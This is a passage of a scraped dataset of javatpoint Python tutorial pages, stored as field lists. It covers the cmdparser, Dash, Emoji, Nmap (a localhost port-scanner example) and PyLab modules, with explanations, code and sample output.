parse tree.']","['pip install cmdparser', 'fries( scam | ham [eggs] | peas [omelette [...]] )', '# Import cmdparser package from cmdparser module', 'from cmdparser import cmdparser', '# Creating a sample parse tree', 'parseTree = cmdparser.parse_spec(""abcd (efgh|ijkl)  [qrst]"")', '# Matching tokens from parse tree', 'parseTree.check_match((""abcd"", ""efgh"", ""something""))', 'parseTree.check_match((""abcd"", ""efgh"", ""anything"", ""uvwx"")) # Will throw an error', '# Completing parse tree in the output', 'parseTree.get_completions((""abcd"", ))', '# Import cmdparser from Cmdparser module', 'from cmdparser import cmdparser', '# Class having fruit names as token', 'class tokenOfFruit(Cmdparser.Token):', 'def get_values(self, context):', 'return [""watermelon"", ""melon"", ""orange"", ""grapes"", ""lichi"", ""mango"", ""apple"", ""banana"", ""strawberry"", ""guava"", ""greenapple""] # Tokens of class with fruit name values', '# Default function for identification', 'def myIdentfictionFactory(token):', 'if token == ""number"":', 'return Cmdparser.IntegerToken(token) # If token is a number', 'elif token == ""fruit"":', 'return tokenOfFruit(token) # If token is a fruit name', 'return None', '# Creating a parse tree with fruit and number token in it', 'parseTree = Cmdparser.parse_spec(""keep   packet"", ident_factory = myIdentfictionFactory)', 'cmdFields = {}', '# Matching with the parse tree', 'parseTree.check_match((""keep"", ""26"", ""mango"", ""packet""), fields = cmdFields)', 'parseTree.check_match((""keep"", ""all"", ""orange"", ""packet""))', '# Getting completions from the parse tree', 'parseTree.get_completions((""keep"", ""24"",))']","['""command invalid somewhere in: \'uvwx\'""', ""{'efgh', 'ijkl'}"", '""\'all\' is not a valid ""', ""{'apple',"", ""'banana',"", ""'grapes',"", ""'greenapple',"", ""'guava',"", ""'lichi',"", ""'mango',"", ""'melon',"", ""'orange',"", ""'strawberry',"", ""'watermelon'}""]",[],"[""|||These command-line interpreters don't have any GUI-based interfaces; that's why CPU and memory resources far from cheaper computers are also available.|||Creating a text-oriented document with the command-line interpreter is very easy, and we can create it very fastly.|||As the command line interpreters are portable, therefore, we can run them anywhere on any device.|||It is very easy to open a file in the command line interpreter, and this method is way faster than getting into drivers and searching into the menu for files.||||||datetimeparse|||cmdparser||||||Token: Token is the base class from the cmdparser sub-package, and it is useful when one of the sets of fixed values is suitable in the parse tree we are creating. In the parse tree, where the list of string values can be static or dynamic, this class can be used to create and accept tokens. We have to override the get_values() method if we want to return a list of valid tokens as a list of strings from the parse tree in the result.|||AnyToken: This base class is similar to the Token class of the sub-package, but any string is to be expected in the result while using the AnyToken base class. If we want to perform validation of the tokens, we can do this via the validate() method available in the sub-module. But, before using the validate() method, we should note that validate() method doesn't allow the tab-completion because it is called only during the entire command is parsed. AnyToken base class also requires the convert() method while calling the list of strings (both static and dynamic).|||AnyTokenString: The AnyTokenString base class is very similar to the AnyToken class in terms of the function performed by both base classes. But, in the AnyTokenString class, all the remaining items from the values we defined on the command line are consumed during the parsing.|||Subtree: The subtree base class from the cmdparser sub-package matches the entire command from the parse tree we created and stores the result of the matching process against the specified token in the dictionary fields. While using the subtree class, we have to pass the command specification string to the class's constructor, and then type classes will override the convert() method to interpret the command.||||||02 November 2020|||01: 28 on Thursday last week etc.||||||TimeSubtree: TimeSubtree class of the datetimeparser sub-module is used to parse the time of a day given in 12 or 24-hour format inside a parse tree. The returned value after parsing the time given is as returned with the help of time.localtime() function.|||DateSubtree: DateSubtree class from the datetimeparser sub-module acts similar to the TimeSubtree class. DateSubtree class includes literals for the different date formats, i.e., days from a week related to the current day (Monday last week), literal date (01-11-2021), descriptive date version (01-November-2021), as well as today, yesterday, and tomorrow along with parse calendar dates. The return value in the case of DateSubtree class is the datetime.date instance from the parse tree.|||DateTimeSubtree: After reading the description of the first two base classes of the datetimeparser sub-module, we can get a basic idea of DateTimeSubtree class by its name. DateTimeSubtree class parses specifications from both date and time given in the parse tree. DateTimeSubtree accepts a combination of TimeSubtree and DateSubtree phrases or a phrase of RelativeTimeSubtree class (We will read next about this class) to parse the specifications of both date and time. In the case of a phrase is from RelativeTimeSubtree class, the time is taken in the relative format according to the time given. The returned value for the DateTimeSubtree class is the datetime.datetime instance value.|||RelativeTimeSubtree: The RelativeTimeSubtree base class from the datetimeparser sub-module returns from the wrapper class as its return value. The RelativeTimeSubtree class is used to parse phrases given in the format, which indicates a time offset from the present time, such as two days ago, three hours ago, etc. The returned value in the case of RelativeTimeSubtree class is an instance of cmdparser.DateDelta class (A wrapper class from the datetimeparser sub-module) contains a datetime.timedelta instance.|||CLassCalenderPeriodSubtree: The CLassCalenderPeriodSubtree is the last base class from the datetimeparser sub-module, and it parses the specification of calender periods given from the past. The return value in the case of this class is 2-tuple of instances from the datetime.date, which represents the following in the return value format: ranges of date specified from the calendar, where the first date from the range is inclusive and the second date from the range is exclusive etc.|||""]"
372,['Python Dash module'],"['We all have surely heard many times that Python is a dynamically typed programming language, but not all of us maybe know that we can also use Python for web development purposes. Yes, it is right, we can use Python for web development, and there are many modules present in Python which help us in this task. In this tutorial, we are going to discuss one such Python module, i.e., the Dash module, which help us to perform web development tasks using Python. We will first look at the introduction of the Dash module, and then we will build a basic dashboard and web application using the Python dash module.']","['https://www.javatpoint.com/python-emoji-module', 'https://www.javatpoint.com/python-cmdparser-module', 'https://www.javatpoint.com/python-emoji-module', 'https://www.javatpoint.com/python-cmdparser-module', 'https://www.javatpoint.com/python-emoji-module']","['https://static.javatpoint.com/python/images/python-dash-module.png', 'https://static.javatpoint.com/python/images/python-dash-module2.png', 'https://static.javatpoint.com/python/images/python-dash-module3.png', 'https://static.javatpoint.com/python/images/python-dash-module4.png']",[],"['Introduction to Python Dash Module', 'Application of Dash Module', 'Conclusion']","['Installation of Dash Module:', 'Creating a Basic Dashboard:', 'Creating Web Application with Dash Callbacks:']",[],"['Step 1: Open the command prompt terminal of the device and locate the directory (using mkdir command) where Python is installed in the system.', 'Step 2: Now write the following command in the terminal to install the Dash module with pip installer:', 'Step 3: When we press the enter key, the pip installer will start installing the Dash module in the system at our defined path.', 'As we can see, the Dash module is successfully installed in our system, and now we can start working with it by importing it into a program.', 'We will create the following two simple web applications using the Dash module in this part:', 'We will build a simple dashboard using the Dash module by following all these given below steps:', 'Step 1: Import all the required libraries:', 'We can import all these above-mentioned required libraries in a Python program using the following code:', 'The dash core components provide us with the following core components of dash:', 'and the dash HTML component has the following HTML function components:', 'Step 2: Design the Layout:', 'Now, look at the following part of the code where we have created a layout and a graph for the web application:', 'Step 3: Create a Server:', 'Explanation:']","['First, we will have to import all the required libraries inside our Python program so that we can use all the required functions for building a dashboard. We have first to import the following dash library components in the program:', 'When we run the program, it will show the default port link in the output, and we have to open our default browser and run the link inside it to see the web application we have built.', 'When we run the above program, the server will redirect us to the localhost with default port 8050, and we have to open it in the default browser of our system so that we can see the web application.']","['Dash is a Python module or framework used to create many analytical web applications, and we can build analytical dashboards using a dash framework. With the help of the Dash module, we can easily create very fast and responsive web dashboards, which are also very good to look at (Having a Great User Interface). When we are using the Dash module, we can build these interactive web dashboards without having any prior knowledge of some mandatory complex front-end web frameworks such as JavaScript, HTML, CSS etc.', 'Now, we have learned what the Dash module is and completed its introduction part; it is time that we should build our first dashboard using the Dash module. But, before building a web application or dashboard using the Dash framework, we have to install the dash module in our system (as it is not a built-in module in Python). Once the installation process of this module is done, we will proceed to the application part of the Dash module.', 'In this section, we will learn how we can install the Dash module in our system so that we can import it into a Python program and its functions to use it as a web framework. We have to follow the following steps to install the Dash module in the system:', 'We will now learn the applications of the Dash module by building a basic dashboard, and after that, we will also build a web application using callbacks so that we can use analytical features in it. With the help of these two basic implementations, we will learn that how we can use the dash framework to build web applications that are very fast and have very good UI.', 'In this section, we will create a simple web dashboard using the Dash module libraries and their functions inside a Python module. The Dashboard we will create in this section will be a simple and static but responsive web dashboard. In the dashboard, we will build a static and responsive graph on the web page using the dash module.', ""In this step, we will design a layout for the web application we are building using Dash's HTML components, core components, and library functions. After creating the layout, we will make a graph, and the graph we create will have various parameters. Following are such parameters that we will use while creating a graph with Dash HTML components:"", 'In the above program, we have html components like dhc.h1 or dhc.div is actually like the components in HTML where dhc.h1 is like heading in HTML and dhc.div is like div class in HTML. We can also interpret the following points from the above-given part of the program:', 'The dashboard is completely ready after we created a layout for the application, but we need a server where we can run it. Therefore, now we will set up a server using the following part of the code in the program and run the dashboard on the server will be created:', ""We can see that we have created a web application, a basic static web application. In this web application, the user cannot take control of the application, and we can't even take inputs from the user. That's why we are going to build a web application where we use the callbacks (that are provided in Dash) to take input from the user and give results according to it."", 'In this section, we will create a web application using the Dash functions and components of Dash like we used while creating a basic dashboard. But we will also use callbacks from the dash to create an application so that we can take user input in the dashboard we build. Here, we will not build the web application step-by-step as we did earlier. We will first look at the following program where we have created a web application with callbacks, and then we will understand the implementation of function and callbacks in the program:', 'When we ran the server and opened the web application dashboard in the web browser with the default port, the application asked for an input value. When we give an input value inside the box, the application will calculate the cube of the given number and give the result of the operation as the output value (we can see this in the output image).', 'In the above example, we used a similar logic as we used in the first example, but we have used many different functions and logic too. First of all, we have imported an additional library in this function, i.e., dash dependencies, to use the input and output function in the web application. While creating the layout, here, we have created a dialogue box where we defined the input and output division class. After that, we have used dash callback so that we can take input from the user and perform an operation on it to produce the output where the output will be the result of the operation. We used exception handling so that if the input value is not a number, we can raise an error. In last, we created a server and ran the application on it.', ""We have two web applications in this tutorial in which one is with a static graph, and the other uses callbacks from the dash. Maybe these web applications are not useful for us, but with the help of these web application's implementation, we can now understand the functions of the Dash library and how to use the Dash module for building a web application.""]","['pip install dash', '# Importing dash library as dsh', 'import dash as dsh', '# Importing dash core components as dc2', 'import dash_core_components as dc2', '# Importing html components from the dash', 'import dash_html_components as dhc', '# Initializing a variable for web application', 'webApp = dsh.Dash()', '# Creating layout for the dashboard', 'webApp.layout = dhc.Div(children =[', 'dhc.H1(""Tutorial on building a web application using Dash""), # Title of the page', 'dc2.Graph(', 'id =""graphExample"", # ID of graph', 'figure ={ # Creating Graph figure', ""'data':["", ""{'x':[1, 3, 5, 7, 9, 11, 13],"", ""'y':[7, 6, 8, 4, 5, 9, 3],"", ""'type':'line',"", ""'name':'Trucks'},"", ""{'x':[1, 3, 5, 7, 9, 11, 13],"", ""'y':[6, 5, 7, 3, 4, 8, 2],"", ""'type':'bar',"", ""'name':'Ships'}"", '],', ""'layout':{ # Layout of the graph"", ""'title':'A Basic Graph for Dashboard' # Title of the graph"", '}', '}', '# Creating a server for the dashboard to run on it', ""if __name__ == '__main__':"", 'webApp.run_server()', '# Importing dash library as dsh', 'import dash as dsh', '# Importing dash core components as dc2', 'import dash_core_components as dc2', '# Importing html components from dash', 'import dash_html_components as dhc', '# Importing dependencies for using input & output', 'from dash.dependencies import Input, Output', 'webApp = dsh.Dash()', '# Layout for the application', 'webApp.layout = dhc.Div(children = [', '# Using input to take input', ""dc2.Input(id = 'input'),"", '# Creating div class for output', ""dhc.Div(id ='output')"", '# Using dash callback for input and output', '@webApp.callback(', '# Returning the output', ""Output(component_id = 'output', component_property = 'children'),"", '# Taking the input value', ""[Input(component_id = 'input', component_property = 'value')]"", '# A default function to perform operation with input value', 'def update_value(input_data):', 'try:', 'return str(float(input_data) ** 3)  # Cube of Input value', 'except:', 'return ""Error, the input value given is not a numeric value""  # If the input value is not a number', '# Creating a server for the dashboard to run on it', ""if __name__ == '__main__':"", 'webApp.run_server()']",[],[],"['|||Dash library|||Dash core components|||Dash HTML components||||||Inputs|||graphs|||buttons etc.||||||Paragraph tags|||Body tags|||Meta tags etc.||||||figure (which will be the graph itself)|||id (By this, we will assign a unique ID to a particular graph)|||layout (It includes a basic layout for the graph, data of both X and Y-axis, the title of the graph etc.)||||||We can easily understand that a figure parameter is essentially a dictionary in which we can define the elements like name, type, x, y etc.|||The name parameter we used in the above code refers to the name associated with the axis of the graph.|||The type parameter we used is referred to the type of graph we want to project in the dashboard, and it can be a line, bar etc.|||x and y can be a single value or a list of values (where values inside x and y are referred to the X-axis and Y-axis, respectively).|||&&&|||A Basic Dashboard|||Web applications with callbacks|||']"
373,['Python Emoji Module'],"['For the past several years, we have seen a huge digital transformation in almost every field and aspect of our life. We can easily observe that how we are now more dependent on technologies than we were ever before. We can see this in every part of our daily life and observe it in daily routines. One part of our life where we can see the huge impact of digital transformation and the role of technology is communication. Technologies have created a bridge, or we can say, filled the gap so that now we are more comfortable and find it more convenient to communicate with anyone. With the help of technology, we can communicate with anyone and from any part of the world.']","['https://www.javatpoint.com/python-nmap-module', 'https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/python-nmap-module', 'https://www.javatpoint.com/python-dash-module', 'https://www.javatpoint.com/python-nmap-module']",['https://static.javatpoint.com/python/images/python-emoji-module.png'],[],['Python Emoji Module'],"['Emoji Module: Introduction', 'Emoji Module: Installation', 'Emoji Module: Implementation']","['Note: Now, many of us wondering that how we will get these CLDR short names of emojis so that we can print emojis in Python with their help. If we want CLDR names of emojis, we can refer to the official website of Unicode CLDR names, and for convenience, we are providing here CLDR names of some famous emojis.']","['emojize() function:', 'Example 1: We will use emojize() function with the short CLDR names of Emojis in the following example program to print emojis:', 'Explanation:', 'Following are the CLDR short names of some famous emojis:', 'demojize function:', 'Example 2: ', 'Printing CLDR short names of emoji by using emoji as an argument inside the demojize function in a Python program:']","['First, we have to open the command prompt terminal shell in the system, and then we have to use the following pip command to install Python Emoji Module through a pip installer:', 'After writing the above-given command in the terminal, we have to press the enter key, and when we press the enter key, the pip installer will start installing the Emoji Module in our system.', 'With the help of the Emoji Module, we cannot just implement emojis in Python but also convert emojis passed into its short names. We have the following two different functions in Emoji Module for these two different tasks:', 'Now, we will learn about both of these functions given above and use each of them inside a Python program to better understand their implementation and functioning.', 'As we can see in the output, multiple emojis with different expressions have been printed according to CLDR short name argument we have passed inside the emojize() function.', 'If we want to see how these all emojis look like, we can use these CLDR short names as an argument inside the emojize() function, and the corresponding emoji with that CLDR short name will be printed in the output.', 'As we can see, the CLDR short name of emojis that we have used in the demojize() function in the program is printed in the output once the program is executed.']","['One important change we can see in the communication process after the digital transformation is the use of messages (text messages, emails etc.) is increased so much. We can now see that messages have been an important part of our life, and if we have to communicate or pass a piece of information to someone or publish an important notice, the most common way we choose to do it is through messages. It can be text messages, messages on a particular application, emails etc., but the one thing that has become much common in all of these is, use of emojis in every messaging application and even in emails & in text messages too.', 'Emojis: Emojis are very small digital images used to express an idea or emotion of the sender. Thus, Emojis are very helpful in saving time and making the sender elaborate their mood easily. Emojis are also very helpful for receivers as, with the help of emojis, they can easily understand with what mood the sender has sent the message.', 'Emojis have become so important that they have also been introduced in programming languages and used by developers for so long. We are going to study the Python Emoji module in this tutorial, and we will learn how we can use this module to print emojis through a Python program.', 'The use of Emojis in Python has also become very common, and we have many ways by which we can use & print emojis through a Python program. We can print emojis through their CLDR names, Unicode or using the emoji module. Using Emoji Module is the most common way of all the mentioned ones, and we are going to use the Emoji Module in a Python program to print emojis. But first, we will learn in brief about the Python Emoji Module and its installation process.', 'Emoji Module is a Python package that allows us to use and print emojis through a Python program, and we can even use this module to use emojis inside an application we are creating using Python. Emoji library in Python is the most common through which we can print Emojis using a Python program, and we should note that Emoji Module is not an in-built module in Python. Using Emoji Module is very simple, and we just have to remember the name of the emoji we want to print in the output.', 'Since Emoji Module is not an in-built library of Python, therefore we have to install this module in our system first in order to use it in a Python program to print emojis. There are many ways to install the Emoji Module on our device, but we will install Emoji Module in our system through the pip installer. We will use the pip installer from the command prompt terminal of our system, and from there, we will install the Python Emoji Module.', 'As we can see that, the installation process for Python Emoji Module is now completed, and this module is successfully installed in our system. Now, we can use functions of the Emoji Module by importing it into a Python program to print emojis in the output.', ""While using the emojize() function in a Python program, we have to pass the CLDR short names of the emoji as a parameter, and then this function will convert the CLDR short names into an emoji. The resultant emoji/s produced by the emojize() function will be printed in the program's output."", 'We have first imported the Emoji Module into the program so that we can use the emojize() module to print modules. Then, we used the emojize() module inside the print statement and printed multiple emojis with this function by passing CLDR short names of emojis as an argument inside the function. We have used CLDR short names of multiple emojis to print multiple emojis with different expressions in the output.', ""When we are given an emoji and want to find out its CLDR short name, we can use the demojize function to do this. We have to pass the emoji as an argument inside the demojize() function, and its CLDR short name will be printed in the output, and that's how we will find out its short name using the demojize function.""]","['pip install emoji', '# Import the Emoji Module', 'import emoji', 'print(""Following are emojis or small digital images of different expressions printed in Python: "")', '# Print different type of Emojis', 'print(""Emoji with grinning faces: "", emoji.emojize("":grinning_face_with_big_eyes:""))', 'print(emoji.emojize("":grinning_squinting_face:""))', 'print(emoji.emojize("":grinning_face_with_smiling_eyes:""))', 'print(emoji.emojize("":grinning_face_with_sweat:""))', 'print(""Emoji with beaming face: "", emoji.emojize("":beaming_face_with_smiling_eyes:""))', '# More popular Emojis', 'print(""More Emoji with popular faces: "")', 'print(emoji.emojize("":grinning_face:""))', 'print(emoji.emojize("":upside-down_face:""))', 'print(emoji.emojize("":zany_face:""))', 'print(emoji.emojize("":shushing_face:""))', '# Import the Emoji Module', 'import emoji', '# Printing CLDR short names of Emojis', 'print(""CLDR short names of various emojis:"")', ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?'))"", ""print(emoji.demojize('?')""]","['Following are emojis or small digital images of different expressions printed in Python:', 'Emoji with grinning faces:  ?', '?', '?', '?', 'Emoji with beaming face:  ?', 'More Emoji with popular faces:', '?', '?', '?', '?', 'CLDR short names of various emojis:', ':shushing_face:', ':zany_face:', ':upside-down_face:', ':grinning_face:', ':beaming_face_with_smiling_eyes:', ':grinning_face_with_sweat:', ':grinning_face_with_smiling_eyes:', ':grinning_squinting_face:', ':grinning_face_with_big_eyes:']",['S. No.|||CLDR short name for Emoji&&&1|||beaming face with smiling eyes&&&2|||grinning face&&&3|||face with tears of joy&&&4|||smiling face with halo&&&5|||face blowing a kiss&&&6|||kissing face with smiling eyes&&&7|||zany face&&&8|||face with hand over mouth&&&9|||face with raised eyebrow&&&10|||smirking face&&&11|||lying face&&&12|||drooling face&&&13|||nauseated face&&&14|||grinning face with big eyes&&&15|||grinning face with sweat&&&16|||upside-down face&&&17|||smiling face with 3 hearts&&&18|||kissing face&&&19|||face savouring food&&&20|||squinting face with tongue'],['|||emojize() function|||demojize() function|||']
374,['Python Nmap Module'],"['We all know about what ports are and how they are associated with URLs, but many of us may not have ever heard about the port scanner. Basically, the port scanner is an application that is designed for probing a host or server connected with the particular port, and it is used for servers and hosts of open ports. From the last line, we can also conclude that we cannot use port scanner applications on closed ports without their special permission, and it is illegal to perform scanning of closed ports without permission. Port scanners are usually used by administrative officials to verify the security policies of their own networks to check how these networks will identify attackers or various threats.']","['https://www.javatpoint.com/python-pylab-module', 'https://www.javatpoint.com/python-emoji-module', 'https://www.javatpoint.com/python-pylab-module', 'https://www.javatpoint.com/python-emoji-module', 'https://www.javatpoint.com/python-pylab-module']",['https://static.javatpoint.com/python/images/python-nmap-module.png'],[],['Nmap Module in Python'],"['Nmap Module: Installation', 'Nmap Module: Implementation']","['Note: Open ports are the ports that do not require special permission from the host to inspect their server or port using a port scanner.', 'Note: To successfully run the program which we are going to discuss in this article, we have to install the nmap tool in our system, and if we want to install this tool in our system, we have to refer to the official website of the nmap tool. From the official website, we can download the setup file for the nmap tool and then we can install the nmap tool in our system to run the program discussed in this article successfully.']","['Nmap: A free and open-source network scanning tool that is used to create port scanners for performing inspection of multiple ports is known as Nmap.', 'We will use the following pip installer command in the command prompt terminal of our device so that we can install Nmap Module in our system:', 'Look at the following example Python program where we have used Nmap Module to perform port scanning of localhost (127.0.0.1):', 'Explanation:']","['After writing the command in the shell as we did, we have to press the enter key to start the installation process and have to wait for a while until the installation process is complete.', 'We can see that now installation process of the Nmap Module is completed, and it is successfully installed in our system. We can now use Nmap Module and its function inside a Python program by importing this module into the program.', ""In the output, we can even see that the result is separately printed for each port to check if the port is closed or open. That's how we can use the Nmap Module in a Python program to create a port scanner and scan multiple ports with it.""]","['Python is a diversified programming language which means we can see applications of Python language in almost every field and task associated with technology. Therefore, a question that will surely come to our mind is that is it possible that we can build a port scanner using Python and one more question, which is can we build a port scanner by ourselves. We can build our own port scanner application, and we can do this even using a Python program. Yes, it is absolutely true that we can build a port scanner application using a Python program, and we can even scan multiple ports using the application we built.', 'Python provides us with modules that we can use in a Python program to build port scanners. One of such modules that we can find in Python is the nmap-python module, and it is used to build port scanners. We are going to learn about the Nmap module in this article, and we will build our own port scanner by using this module in a Python program.', 'Nmap Module, whose actual name is nmap-python Module, is an open-source Python module that helps us achieve the task of port scanning by creating a port scanner using the Python program. By using this Nmap Module in a Python program, we can build a port scanner, and when we run the program, the port scanner will automatically inspect the port ranges we defined inside the program.', 'Python Nmap Module is not an inbuilt module in Python, and if we want to create a port scanner using this module in Python, we have first to install it in our system. There are multiple ways through which we can install this Nmap Module in our system, but we will prefer to use the pip installer to achieve this task. Therefore, we will use the pip installer from the command prompt terminal to install the Nmap Module in our device so that we can import it into a Python program.', 'We will now use this Nmap Module in a Python program, and with the help of functions provided in this module, we will create a port scanner using the program. As we have already learned that doing port scanning of closed ports without permission is illegal, therefore we will use the port scanner by choosing localhost (127.0.0.1) as our target. In this example Python program, we will give the range in the port scanner, and the program will tell us which port in the given range is open and which port is closed.', ""We have first imported the Nmap Module into our program so that we can use the port scanner and other functions in the program. After that, we have defined the range which we will scan each port to check whether the port (from the range) is closed or open, and we will do this with every port present in the range. After that, we have defined the target host for performing the inspection, and we initialized the 'targetHost' variable to open the local host in it. Then, we used the portscanner() function from the Nmap Module to initialize a scanner variable which we will use to scan the target host later. After that, we used a for loop so that we could loop over each port given in the range and check if it is closed or open. Inside the for loop, first, we have initialized a 'resultant' variable where we scanned the target host using the scanner variable we initialized previously. After that, in for loop, we again called the resultant variable to store the result whether the port is closed or open, and we used the dictionary that contains multiple variables to produce the result. In last, we used the print statement to print the result for each port from the range. This for loop will continue until it reaches the ending point of the range, and then the program will be completely executed.""]","['pip install python-nmap', '# Import Nmap Module', 'import nmap', '# Providing range of port scanning', 'starting = 70', 'closing = 90', '# Assigning target host', ""targetHost = '127.0.0.1'"", '# Using scanner from Nmap Module', 'portScanner = nmap.PortScanner()', '# Looping over the range to check each port', 'for j in range(starting, closing + 1):', '# Scanning the target host', 'resultant = portScanner.scan(targetHost, str(j))', '# Storing result in the form of dictionary', ""resultant = resultant['scan'][targetHost]['tcp'][j]['state']"", '# Printing result for port', ""print(f'The port {j} number from the range is {resultant}.')""]","['The port 70 number in the range is closed.', 'The port 71 number in the range is closed.', 'The port 72 number in the range is closed.', 'The port 73 number in the range is closed.', 'The port 74 number in the range is closed.', 'The port 75 number in the range is closed.', 'The port 76 number in the range is closed.', 'The port 77 number in the range is closed.', 'The port 78 number in the range is closed.', 'The port 79 number in the range is closed.', 'The port 80 number in the range is closed.', 'The port 81 number in the range is closed.', 'The port 82 number in the range is closed.', 'The port 83 number in the range is closed.', 'The port 84 number in the range is closed.', 'The port 85 number in the range is closed.', 'The port 86 number in the range is closed.', 'The port 87 number in the range is closed.', 'The port 88 number in the range is closed.', 'The port 89 number in the range is closed.', 'The port 90 number in the range is closed.']",[],[]
375,['Python PyLab Module'],"[""While performing some tasks, we have to use graphs like line charts, bar graphs, etc., for many reasons like to make the task more interactive, to pass the information in a very interesting way, graphs are easy and self-explanatory, etc. That's why plotting a graph or chart is a very important and integrated part of many functions. Graphs and charts play a very important role in the field of programming, and developers are always recommended for using graphs in their programs. Therefore, it becomes very important that we should be aware of how we can plot graphs from a program. MATLAB is considered the best to plot graphs and charts, but it is not possible for everyone to use MATLAB for plotting graphs & charts. We have many interactive modules present in Python that allow us to plot graphs and charts in the output, but here we will talk about the module, which provides us a MATLAB-like namespace by importing functions. We will talk about the PyLab Module of Python in this tutorial, and we will learn how we can plot graphs and chart in the output using functions of this module in a program.""]","['https://www.javatpoint.com/working-with-pdf-files-in-python', 'https://www.javatpoint.com/python-nmap-module', 'https://www.javatpoint.com/working-with-pdf-files-in-python', 'https://www.javatpoint.com/python-nmap-module', 'https://www.javatpoint.com/working-with-pdf-files-in-python']","['https://static.javatpoint.com/python/images/python-pylab-module.png', 'https://static.javatpoint.com/python/images/python-pylab-module2.png', 'https://static.javatpoint.com/python/images/python-pylab-module3.png', 'https://static.javatpoint.com/python/images/python-pylab-module4.png', 'https://static.javatpoint.com/python/images/python-pylab-module5.png']",[],"['PyLab Module in Python', 'Conclusion']","['PyLab Module: Introduction', 'PyLab Module: Installation', 'PyLab Module: Implementation', 'Basic plotting with PyLab Module:', 'Advance Plotting with PyLab Module:']",[],"['Look at the following Python program from which we will plot a basic curve in the output:', 'Explanation: ', ""As we can see in the output that the curve is displayed with the X and Y-axis points, we have defined inside 'a' and 'b' variables, respectively."", 'Example 2:', 'Look at the following Python program where we will plot a curve in the output having symbols, using the PyLab Module:', 'Explanation:', 'Example 3: ', 'Look at the following Python program where we will plot a curve in the output having a colorful line, using the PyLab Module:', 'Explanation:', 'Example 4:', 'Look at the following Python program where we will plot a curve in the output using the PyLab Module:', 'As we can see in the output, we have printed a curve having a colorful symbol line in the output.', 'Example 5:', 'Look at the following Python program where we have used plot() function multiple times to overlaid the curve:', 'As we can see in the output that we have plotted multiple curves and overlaid them by using the plot() function multiple times in the program.']","['We have installed all the requisite libraries for the PyLab Module, and now we can use the PyLab Module in the Python programs to plot graphs and charts from its functions.', ""Plotting curves using the PyLab Module in a Python program requires the use of a plot command, and this command takes a pair of arrays or sequences having the same length. Let's understand this implementation through an example program."", ""As we can see in the output that the curve is displayed with the X and Y-axis points, we have defined inside 'a' and 'b' variable, respectively, and it has the '^' symbol instead of a straight line."", 'We can use the following set of symbols as the argument inside the plot() function if we want to print a symbol line instead of a straight line in the curve:', 'We can use the following set of color codes as the additional argument inside the plot() function if we want to print a straight line having our choice of color in the curve:']","[""PyLab is a Python package that provides us a namespace in Python programming, which is very similar to MATLAB interface, by importing the functions from Python Numpy and Matplotlib Module. If we talk about these modules' role in the PyLab package, Matplotlib Module provides functions that help us to create visualizations of data, whereas the Numpy Module provides efficient numerical vector calculation functions that are based on underlying C and Fortran binary libraries. We will learn about PyLab Module in this section, and we will then plot some basic graphs and charts using the elements & functions which this module provides to us."", ""PyLab Module is an associated module with the Matplotlib Module of Python, and it gets installed alongside when we are installing Matplotlib Module in our system. We can also say that PyLab is a procedural interface of the Matplotlib Module, an object-oriented plotting library of Python. PyLab in itself is a convincing module for us because its bulky import the NumPy Module's functions and matplotlib.pyplot package in a single namespace to provide us a MATLAB-like namespace."", 'As we have already discussed, the PyLab Module gets installed alongside the installation of the Matplotlib package. Still, if we want to use this module in a Python program, we should make sure that Matplotlib Module is present in our system. If Matplotlib is not present in the system, then we can use the following pip installer command in the command prompt terminal shell to install Matplotlib Module to get the PyLab Module with it:', 'Other than this, we have also discussed that PyLab Module also uses the mathematical and vector operation functions from the Numpy Module. Therefore, we have to make sure that Numpy Module is also present in our system, and if it is not installed, then we can use the following command to install the numpy module from the command prompt terminal:', 'Here, we will use the functions of the PyLab Module to plot simple curves and graphs by using them inside a Python program to understand its implementation. We will first start with the basic plotting of curves, and then we will use some advanced functions to make the plotted graphs and curves more interactive.', 'We have first imported all the functions from the Numpy and PyLab Module to use them in the program for plotting a curve in the output. After that, we have defined the X and Y-axis for the curve in the a & b variable, respectively. Then, we used the plot() function and provided a and b variables as arguments. In last, we used the show() function to display the curve we plotted in the output.', '1. We can use some arguments in the plot() function along with the x and y variable arguments we are providing inside it to plot more interactive curves using the PyLab Module. We have to provide additional string arguments inside the plot() function to print symbol lines instead of the straight line in the curves. We can understand this by using the additional argument in the following example program:', ""After importing functions from both Numpy and PyLab Module in the program, we have defined the 'a' and 'b' variables for the X and Y-axis of the curve, respectively. After that, we have used the plot() function, and inside the plot function, we have provided an additional argument of the '^' symbol with the a & b variable to show the curve with a symbol instead of a simple straight line."", '2. Other than this, if we want, we can also print the lines with other colors than the default color plotted in the output curve, and for performing this task, we have to follow the same set of instructions. We have to use the color argument as an additional argument inside the plot() function so that the line of curve printed in the output will be printed in the color of our choice. We can understand this by using the additional argument in the following example program:', 'We have used the same logic in this program as we have used in the program given in the previous example. We have used the color argument in the plot() function of this program to print the curve having a colorful line in the output. Last, we used the show() function to display the curve with our customized variable in the output.', ""As we can see in the output that the curve is displayed with the X and Y-axis points, we have defined inside the 'a' and 'b' variable, respectively, and it has the yellow color line in it because we have given an additional color argument in the plot() function."", ""4. Now, if you wonder whether we can perform both the operation (printing a symbol line instead of a straight line and printing it with the color of choice) simultaneously or not, the answer is yes. We can perform both the task simultaneously, and we just have to provide both the arguments together as a single additional argument like '_y' inside the plot() function. Then, it will perform both the operations simultaneously, and a curve having a symbol line with the color of our choice will be printed in the output. We can understand this by using the additional argument in the following example program:"", '4. In last, we can also print multiple curves inside and overlaid them under a single plot and for that we just have to use multiple plot() functions together in a program. We can understand this method through by using the multiple plot() function in the following example program:', 'We have learned about PyLab Module in this tutorial, where we learned that PyLab Module provides us a MATLAB-like namespace, and it is very helpful for plotting multipurpose curves using a Python program. We have plotted multiple types of curves in the output by importing functions from PyLab and Numpy Module in the program. After starting with basic plotting, we plotted curves having symbol line or/and color in line, and we overlaid curves.']","['pip install matplotlib', 'pip install numpy', '# Importing from Numpy', 'from numpy import *', '# Importing from PyLab', 'from pylab import *', '# X-axis of the curve', 'a = linspace(-4, 2, 6)', '# Y-axis of the curve', 'b = a**2', '# Plotting the curve with x and y-axis', 'plot(a, b)', '# Showing curve in the output', '# Importing from Numpy', 'from numpy import *', '# Importing from PyLab', 'from pylab import *', '# X-axis of the curve', 'a = linspace(-4, 8, 32)', '# Y-axis of the curve', 'b = a ** 3', '# Plotting the 